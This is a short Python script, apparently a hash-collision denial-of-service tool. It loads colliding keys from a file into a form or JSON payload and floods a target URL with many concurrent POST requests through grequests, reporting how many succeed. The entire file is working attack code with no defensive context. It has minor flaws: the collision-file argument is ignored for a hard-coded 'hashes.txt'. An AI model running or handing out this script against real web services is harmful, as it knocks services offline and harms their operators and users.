#!/usr/bin/env python
import grequests
import time
import sys
import json


def prepare_payload(collision_file):
    # Payload has to contain the correct names
    # otherwise the request will fail because of an index out of bounds errors
    payload = {"name": "", "email": ""}
    with open("hashes.txt") as fh:
        for i, line in enumerate(fh):
            payload[line.strip()] = i
    return payload


def attack_with_form_fields(url, payload):
    return grequests.post(url, data=payload)


def attack_with_json_api(url, payload):
    return grequests.post(url, data=json.dumps(payload))


if __name__ == "__main__":
    url = sys.argv[1]
    collision_file = sys.argv[2]
    count = int(sys.argv[3])
    method = sys.argv[4]

    payoad = prepare_payload(collision_file)
    reqs = []

    for i in range(0, count):
        if method == "form":
            req = attack_with_form_fields(url, payoad)
        if method == "json":
            req = attack_with_json_api(url, payoad)

        reqs.append(req)

    successful_responses = 0
    failed_responses = 0

    start = time.time()
    for resp in grequests.imap(reqs, stream=False, size=100):
        if resp.status_code == 200:
            successful_responses += 1
        else:
            failed_responses += 1
        resp.close()
    end = time.time()
    request_time = end - start
    print("Made {0} requests in {1}seconds".format(count, request_time))
    print("Successful: {0}".format(successful_responses))
    print("Failed: {0}".format((failed_responses)))
